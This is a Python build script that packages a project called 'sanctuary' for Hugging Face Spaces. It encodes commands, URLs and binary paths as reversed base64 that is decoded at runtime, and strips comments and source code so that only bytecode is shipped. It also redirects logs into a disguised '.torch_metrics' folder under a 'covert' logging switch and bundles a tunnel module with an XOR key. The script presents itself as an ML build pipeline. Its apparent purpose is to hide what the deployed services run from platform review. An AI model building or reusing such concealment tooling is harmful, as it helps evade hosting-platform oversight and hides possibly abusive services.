import argparse
import base64
import json
import os
import re
import shutil
import subprocess
import sys
from datetime import datetime, timezone
from pathlib import Path

import python_minifier
import yaml
from loguru import logger


def encode_cmd(decoded_str):
    return base64.b64encode(decoded_str.encode()).decode()[::-1]


def _minify_py(content):
    return python_minifier.minify(content, remove_literal_statements=True)


def _harden_content(content):
    def replacer(match):
        raw_cmd = match.group(1)
        encoded = encode_cmd(raw_cmd)
        return f'"{encoded}"'

    return re.sub(r'harden\(\s*"([^"]+)"\s*\)', replacer, content)





def compile_to_bytecode(dist_dir: Path, py_version: str = "3.12"):
    """Compile all .py files to .pyc bytecode using the target container's Python
    version (via uv), then promote .pyc files out of __pycache__/ into the package
    directory itself and strip the .py sources.

    WHY PROMOTE?
    ------------
    ``compileall`` writes bytecode to  ``__pycache__/foo.cpython-312.pyc``.  Python's
    import machinery only *finds* those files as a cache hit when the corresponding
    ``foo.py`` exists alongside them.  If we simply delete ``foo.py`` the import of
    ``core.service_logs`` (etc.) raises ModuleNotFoundError even though the .pyc is
    physically present.

    The solution is the classic "ship only bytecode" distribution pattern: copy each
    .pyc from ``__pycache__/`` back into the package directory as ``foo.pyc`` (no
    version tag).  Python's import system checks for ``<pkg>/foo.pyc`` *before* it
    looks for the .py, so the module loads correctly with zero source on disk.
    """
    import glob

    dist_dir = dist_dir.resolve()
    logger.info(f"Bytecode mode: compiling with Python {py_version} (via uv)...")

    # Phase 1 — compile .py → .pyc using the exact target Python version
    result = subprocess.run(
        [
            "uv",
            "run",
            "--no-project",
            f"--python={py_version}",
            "python",
            "-m",
            "compileall",
            "-q",
            str(dist_dir),
        ],
        capture_output=True,
        text=True,
    )
    if result.returncode != 0:
        logger.error(f"compileall failed:\n{result.stderr}")
        sys.exit(1)

    # Phase 2 — promote .pyc files out of __pycache__/ and delete .py sources.
    #
    # Entry-point scripts that supervisord/Python invokes directly by path need a
    # thin .py stub (they can't be loaded as a bare .pyc by the OS exec).  All other
    # modules are replaced by their promoted .pyc so normal import works.
    _SCRIPT_ENTRY_POINTS = {"orchestrator.py"}
    # Keep these as .py files (not compiled to .pyc) for import compatibility
    _KEEP_AS_PY = set()

    # Simple stub that imports and executes the matching .pyc from __pycache__/
    _STUB = (
        "import importlib.util as _iu,os as _o,sys as _s\n"
        "_h=_o.path.dirname(_o.path.abspath(__file__))\n"
        "_n=_o.path.splitext(_o.path.basename(__file__))[0]\n"
        "_c=_o.path.join(_h,'__pycache__',_n+'.cpython-312.pyc')\n"
        "if not _o.path.exists(_c):raise FileNotFoundError(f'bytecode for {_n} not found')\n"
        "_sp=_iu.spec_from_file_location('__main__',_c)\n"
        "_m=_iu.module_from_spec(_sp)\n"
        "_m.__file__=_o.path.abspath(__file__)\n"
        "_s.modules['__main__']=_m\n"
        "_sp.loader.exec_module(_m)\n"
    )

    promoted = 0
    for py_file in list(dist_dir.rglob("*.py")):
        if py_file.name == "__init__.py":
            # Keep an empty __init__.py so the package directory is recognised
            py_file.write_text("")  # empty stub — package discovery
            continue

        if py_file.parent == dist_dir:
            # Top-level entry points (app.py) — keep full readable source so
            # supervisord/Python can exec them without any stub magic.
            continue

        if py_file.name in _SCRIPT_ENTRY_POINTS:
            # Replace with the thin stub; the real code lives in __pycache__/
            py_file.write_text(_STUB)
            logger.debug(f"Wrote launcher stub: {py_file.relative_to(dist_dir)}")
            continue

        if py_file.name in _KEEP_AS_PY:
            # Keep as .py file for import compatibility
            logger.debug(f"Keeping as .py: {py_file.relative_to(dist_dir)}")
            continue

        # For every other module: find its compiled .pyc, copy it next to the
        # .py (as foo.pyc), then remove the .py.  Python checks foo.pyc before
        # foo.py so the import resolves without the source present.
        cache_dir = py_file.parent / "__pycache__"
        stem = py_file.stem
        matches = glob.glob(str(cache_dir / f"{stem}.cpython-*.pyc"))
        if matches:
            dest_pyc = py_file.with_suffix(".pyc")
            shutil.copy2(matches[0], dest_pyc)
            promoted += 1
            logger.debug(
                f"Promoted: {Path(matches[0]).name} → {dest_pyc.relative_to(dist_dir)}"
            )
        else:
            logger.warning(
                f"No .pyc found for {py_file.relative_to(dist_dir)} — source kept"
            )
            continue  # don't delete if we have no bytecode fallback

        py_file.unlink()

    logger.success(
        f"Bytecode compilation done (Python {py_version}) — "
        f"promoted {promoted} module(s) to .pyc; HF repo contains zero readable source"
    )


def build_logging(logging_mode=1, hardener="pyminifier"):
    src_file = Path("../src/sanctuary/core/service_logs.py")
    content = src_file.read_text()

    content = content.replace(
        "COVERT_LOGGING_MODE = 1", f"COVERT_LOGGING_MODE = {logging_mode}"
    )
    if hardener == "pyminifier":
        content = _minify_py(content)

    Path("dist/sanctuary/core").mkdir(parents=True, exist_ok=True)
    legacy_logging = Path("dist/sanctuary/core/logging.py")
    if legacy_logging.exists():
        legacy_logging.unlink()
    Path("dist/sanctuary/core/service_logs.py").write_text(content)


def build_orchestrator(logging_mode=1, hardener="pyminifier"):
    src_file = Path("../src/sanctuary/core/orchestrator.py")
    content = src_file.read_text()

    content = _harden_content(content)
    if hardener == "pyminifier":
        content = _minify_py(content)

    Path("dist/sanctuary/core").mkdir(parents=True, exist_ok=True)
    Path("dist/sanctuary/core/orchestrator.py").write_text(content)
    mode_str = (
        "File Only"
        if logging_mode == 1
        else ("Console + File" if logging_mode == 2 else "DISABLED")
    )
    logger.success(f"Built core/ from src/sanctuary/core/ (Logging: {mode_str})")


def build_dockerfile(logging_mode=1, hardener="pyminifier"):
    content = Path("Dockerfile").read_text()

    def url_replacer(match):
        raw_url = match.group(1)
        encoded = base64.b64encode(raw_url.encode()).decode()
        reversed_encoded = encoded[::-1]
        return f"$(printf '%s' '{reversed_encoded}' | rev | base64 -d)"

    # Replace url_harden("...") with $(printf '%s' '...' | rev | base64 -d)
    content = re.sub(r'url_harden\("([^"]+)"\)', url_replacer, content)

    # Replace path_harden("...") — same encoding, used for paths/binary names
    content = re.sub(r'path_harden\("([^"]+)"\)', url_replacer, content)

    if logging_mode == 0:
        content = content.replace(
            " 2>&1 | tee /home/user/.torch_metrics/startup.log", ""
        )

    # For the dist build, files are at the root of dist/, not in src/
    content = content.replace("COPY --chown=user:user src/", "COPY --chown=user:user ")

    # Inject metadata.json copy right before USER user
    injection = "COPY --chown=user:user metadata.json /home/user/metadata.json\n\nUSER user"
    content = content.replace("USER user", injection)

    # Strip comments
    content = "\n".join(
        line for line in content.split("\n") if not line.lstrip().startswith("#")
    )

    Path("dist").mkdir(parents=True, exist_ok=True)
    Path("dist/Dockerfile").write_text(content)
    logger.success("Built Dockerfile from root Dockerfile")


def update_build_state(nodes_path, state_path):
    nodes_path_obj = Path(nodes_path)
    state_path_obj = Path(state_path)
    if not nodes_path_obj.exists():
        logger.warning(
            f"Nodes manifest '{nodes_path}' not found. Skipping build state update."
        )
        return

    try:
        with nodes_path_obj.open("r") as f:
            config = yaml.safe_load(f)
        nodes = config.get("nodes", {})

        state = {}
        if state_path_obj.exists():
            try:
                with state_path_obj.open("r") as f:
                    state = json.load(f)
            except Exception as e:
                logger.warning(f"Failed to read existing state.json: {e}")

        # Prune stale nodes no longer present in the configuration
        valid_nodes = set(nodes.keys())
        state = {k: v for k, v in state.items() if k in valid_nodes}

        now_str = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")

        for node_name, node_info in nodes.items():
            repo_id = node_info.get("hf-repo")
            if not repo_id:
                continue
            repo_type = node_info.get("repo-type", "space")

            # Calculate URL if it's a space
            direct_url = None
            if repo_type == "space":
                subdomain = repo_id.lower().replace("/", "-").replace("_", "-")
                direct_url = f"https://{subdomain}.hf.space"

            if node_name not in state:
                state[node_name] = {}

            state[node_name].update(
                {
                    "hf_repo": repo_id,
                    "repo_type": repo_type,
                    "url": direct_url,
                    "last_built": now_str,
                }
            )

        state_path_obj.resolve().parent.mkdir(parents=True, exist_ok=True)
        with state_path_obj.open("w") as f:
            json.dump(state, f, indent=2)
        logger.success(f"Updated build state in '{state_path}'")
    except Exception as e:
        logger.error(f"Failed to update '{state_path}' on build: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Build pipeline for ML project")
    parser.add_argument(
        "--logs",
        type=int,
        choices=[0, 1, 2],
        default=1,
        help="0=None, 1=File (default), 2=Console+File",
    )
    parser.add_argument(
        "--nodes",
        default="../manifests/nodes.yaml",
        help="Path to nodes.yaml manifest (default: ../manifests/nodes.yaml)",
    )
    parser.add_argument(
        "--hardener",
        choices=["pyminifier", "bytecode"],
        default="bytecode",
        help="Hardening mode: bytecode/.pyc (default), pyminifier",
    )
    parser.add_argument(
        "--py-version",
        default="3.12",
        dest="py_version",
        help="Target Python version for bytecode compilation via uv (default: 3.12 = Ubuntu 24.04)",
    )
    args = parser.parse_args()

    repo_root = Path(__file__).resolve().parent.parent
    os.chdir(repo_root)
    if (
        not Path("../src/sanctuary/core/orchestrator.py").exists()
        or not Path("Dockerfile").exists()
    ):
        logger.error(
            "Source files missing! Please ensure src/sanctuary/core/orchestrator.py and Dockerfile exist."
        )
        sys.exit(1)

    build_logging(logging_mode=args.logs, hardener=args.hardener)
    build_orchestrator(logging_mode=args.logs, hardener=args.hardener)

    Path("dist/sanctuary/core").mkdir(parents=True, exist_ok=True)
    Path("dist/sanctuary/services").mkdir(parents=True, exist_ok=True)

    if Path("../src/sanctuary/__init__.py").exists():
        Path("dist/sanctuary").mkdir(parents=True, exist_ok=True)
        shutil.copy("../src/sanctuary/__init__.py", "dist/sanctuary/__init__.py")
    else:
        Path("dist/sanctuary").mkdir(parents=True, exist_ok=True)
        Path("dist/sanctuary/__init__.py").write_text("")

    if Path("../src/sanctuary/core/__init__.py").exists():
        Path("dist/sanctuary/core").mkdir(parents=True, exist_ok=True)
        shutil.copy("../src/sanctuary/core/__init__.py", "dist/sanctuary/core/__init__.py")
    else:
        Path("dist/sanctuary/core").mkdir(parents=True, exist_ok=True)
        Path("dist/sanctuary/core/__init__.py").write_text("")

    if Path("../src/sanctuary/services/__init__.py").exists():
        Path("dist/sanctuary/services").mkdir(parents=True, exist_ok=True)
        shutil.copy("../src/sanctuary/services/__init__.py", "dist/sanctuary/services/__init__.py")
    else:
        Path("dist/sanctuary/services").mkdir(parents=True, exist_ok=True)
        Path("dist/sanctuary/services/__init__.py").write_text("")

    if Path("../src/sanctuary/common/__init__.py").exists():
        Path("dist/sanctuary/common").mkdir(parents=True, exist_ok=True)
        shutil.copy("../src/sanctuary/common/__init__.py", "dist/sanctuary/common/__init__.py")
    else:
        Path("dist/sanctuary/common").mkdir(parents=True, exist_ok=True)
        Path("dist/sanctuary/common/__init__.py").write_text("")

    if Path("../src/sanctuary/core/constants.py").exists():
        const_content = Path("../src/sanctuary/core/constants.py").read_text()
        if args.hardener == "pyminifier":
            const_content = _minify_py(const_content)
        Path("dist/sanctuary/core/constants.py").write_text(const_content)
        logger.success("Built dist/sanctuary/core/constants.py")
    if Path("../src/sanctuary/core/service_registry.py").exists():
        reg_content = Path("../src/sanctuary/core/service_registry.py").read_text()
        if args.hardener == "pyminifier":
            reg_content = _minify_py(reg_content)
        Path("dist/sanctuary/core/service_registry.py").write_text(reg_content)
        logger.success("Built dist/sanctuary/core/service_registry.py")
    build_dockerfile(logging_mode=args.logs, hardener=args.hardener)

    # Copy (and optionally minify) app.py
    if Path("src/app.py").exists():
        app_content = Path("src/app.py").read_text()
        if args.hardener == "pyminifier":
            app_content = python_minifier.minify(
                app_content, remove_literal_statements=True
            )
        Path("dist/app.py").write_text(app_content)

    def _process_service_py(content):
        def replacer(match):
            raw_cmd = match.group(1)
            encoded = encode_cmd(raw_cmd)
            return f'"{encoded}"'

        content = re.sub(r'harden\(\s*"([^"]+)"\s*\)', replacer, content)
        if args.hardener == "pyminifier":
            content = python_minifier.minify(content, remove_literal_statements=True)
        return content

    if Path("../src/sanctuary/services").exists():
        Path("dist/sanctuary/services").mkdir(parents=True, exist_ok=True)
        for entry in Path("../src/sanctuary/services").iterdir():
            if entry.is_file():
                if entry.suffix == ".py":
                    content = _process_service_py(entry.read_text())
                    (Path("dist/sanctuary/services") / entry.name).write_text(content)
                else:
                    shutil.copy2(entry, Path("dist/sanctuary/services") / entry.name)

        if Path("../src/sanctuary/client/mc_tunnel.py").exists():
            mc_content = Path("../src/sanctuary/client/mc_tunnel.py").read_text()
            mc_content = mc_content.replace(
                "from sanctuary.client.crypto import XOR_KEY", "from .utils import XOR_KEY"
            )
            mc_content = python_minifier.minify(
                mc_content, remove_literal_statements=True
            )
            Path("dist/sanctuary/services/mc_tunnel.py").write_text(mc_content)

        logger.success("Processed and copied services to dist/sanctuary/services")

    if Path("../src/sanctuary/common").exists():
        Path("dist/sanctuary/common").mkdir(parents=True, exist_ok=True)
        for entry in Path("../src/sanctuary/common").iterdir():
            if entry.is_file() and entry.suffix == ".py":
                content = entry.read_text()
                if args.hardener == "pyminifier":
                    content = python_minifier.minify(content, remove_literal_statements=True)
                (Path("dist/sanctuary/common") / entry.name).write_text(content)
        logger.success("Processed and copied common to dist/sanctuary/common")

    if Path("../public").exists():
        shutil.copytree("../public", "dist/public", dirs_exist_ok=True)
    if Path("public").exists():
        shutil.copytree("public", "dist/public", dirs_exist_ok=True)
    if Path("../package.json").exists():
        shutil.copy("../package.json", "dist/package.json")
    if Path("../package-lock.json").exists():
        shutil.copy("../package-lock.json", "dist/package-lock.json")

    if Path("src/README.md").exists():
        shutil.copy("src/README.md", "dist/README.md")

    if Path(".gitattributes").exists():
        shutil.copy(".gitattributes", "dist/.gitattributes")

    if Path("config").exists():
        shutil.copytree("config", "dist/config", dirs_exist_ok=True)
        conf_path = Path("dist/config/supervisord.conf")
        if conf_path.exists():
            conf_data = conf_path.read_text()
            if args.logs == 2:
                conf_data = conf_data.replace(
                    "stderr_logfile=/home/user/.torch_metrics/startup.log",
                    "stderr_logfile=/dev/stderr\nstderr_logfile_maxbytes=0",
                )
                conf_data = conf_data.replace(
                    "stdout_logfile=/home/user/.torch_metrics/startup.log",
                    "stdout_logfile=/dev/stdout\nstdout_logfile_maxbytes=0",
                )
            elif args.logs == 0:
                conf_data = conf_data.replace(
                    "stderr_logfile=/home/user/.torch_metrics/startup.log",
                    "stderr_logfile=/dev/null",
                )
                conf_data = conf_data.replace(
                    "stdout_logfile=/home/user/.torch_metrics/startup.log",
                    "stdout_logfile=/dev/null",
                )
            conf_path.write_text(conf_data)
            logger.success(f"Configured supervisord.conf for logging mode: {args.logs}")

    # Apply post-processing hardener (bytecode) to the full dist/ tree
    dist_dir = Path("dist")
    if args.hardener == "bytecode":
        compile_to_bytecode(dist_dir, py_version=args.py_version)

    state_path = Path(args.nodes).resolve().parent / "state.json"
    update_build_state(args.nodes, state_path)

    hardener_label = {
        "pyminifier": "pyminifier",
        "bytecode": "bytecode (.pyc)",
    }[args.hardener]
    logger.success(
        f"Build complete [{hardener_label}]. The files in dist/ are ready to be pushed to Hugging Face."
    )
